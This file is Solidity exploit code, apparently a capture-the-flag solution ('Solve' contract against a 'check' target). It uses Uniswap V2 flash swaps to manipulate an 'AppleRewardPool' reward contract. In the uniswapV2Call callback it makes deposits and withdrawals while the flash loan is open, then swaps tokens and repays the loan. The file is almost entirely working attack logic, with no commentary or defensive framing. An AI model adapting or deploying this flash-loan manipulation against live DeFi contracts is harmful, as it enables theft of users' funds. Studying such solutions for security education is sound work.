pragma solidity 0.5.16;
import "hardhat/console.sol";

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);
}

interface check {
    function token0() external returns (address);

    function token1() external returns (address);

    function token2() external returns (address);

    function token3() external returns (address);

    function appleRewardPool() external returns (address);

    function pair1() external returns (address);

    function pair2() external returns (address);

    function deposit(uint256 _pid, uint256 _amount) external;
}

interface AppleRewardPool {
    function deposit(uint256 _pid, uint256 _amount) external;

    function rate1() external returns (uint256);

    function withdraw(uint256 _pid, uint256 _amount) external;
}

contract Solve {
    address target;
    uint stage = 0;

    constructor(address _addr) public {
        target = _addr;
        IERC20(check(target).token0()).approve(
            check(target).pair2(),
            20000 * 10 ** 18
        );
        IERC20(check(target).token1()).approve(
            check(target).pair2(),
            20000 * 10 ** 18
        );
        IERC20(check(target).token2()).approve(
            check(target).pair2(),
            20000 * 10 ** 18
        );
        IERC20(check(target).token3()).approve(
            check(target).pair2(),
            20000 * 10 ** 18
        );
        IERC20(check(target).token0()).approve(
            check(target).appleRewardPool(),
            20000 * 10 ** 18
        );
        IERC20(check(target).token1()).approve(
            check(target).appleRewardPool(),
            20000 * 10 ** 18
        );
        IERC20(check(target).token2()).approve(
            check(target).appleRewardPool(),
            20000 * 10 ** 18
        );
        IERC20(check(target).token3()).approve(
            check(target).appleRewardPool(),
            20000 * 10 ** 18
        );
    }

    function solve() public {
        IUniswapV2Pair(check(target).pair1()).swap(
            0,
            10000 * 10 ** 18 - 1,
            address(this),
            new bytes(0x01)
        ); // token0, token1

        IUniswapV2Pair(check(target).pair2()).swap(
            0,
            5000 * 10 ** 18,
            address(this),
            new bytes(0x01)
        ); // token1, token2
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        if (stage == 0) {
            AppleRewardPool(check(target).appleRewardPool()).deposit(0, 1);
            AppleRewardPool(check(target).appleRewardPool()).withdraw(0, 1);
            IERC20(check(target).token2()).transfer(
                check(target).pair2(),
                10000 * 10 ** 18
            );

            IUniswapV2Pair(check(target).pair2()).swap(
                5000 * 10 ** 18,
                0,
                address(this),
                new bytes(0)
            ); //
            IERC20(check(target).token1()).transfer(
                check(target).pair1(),
                10000 * 10 ** 18 - 1
            );
            stage = 1;
        } else {
            AppleRewardPool(check(target).appleRewardPool()).deposit(
                1,
                5000 * 10 ** 18
            );
            IERC20(check(target).token1()).transfer(
                check(target).pair2(),
                IERC20(check(target).token1()).balanceOf(address(this))
            );
        }
    }
}
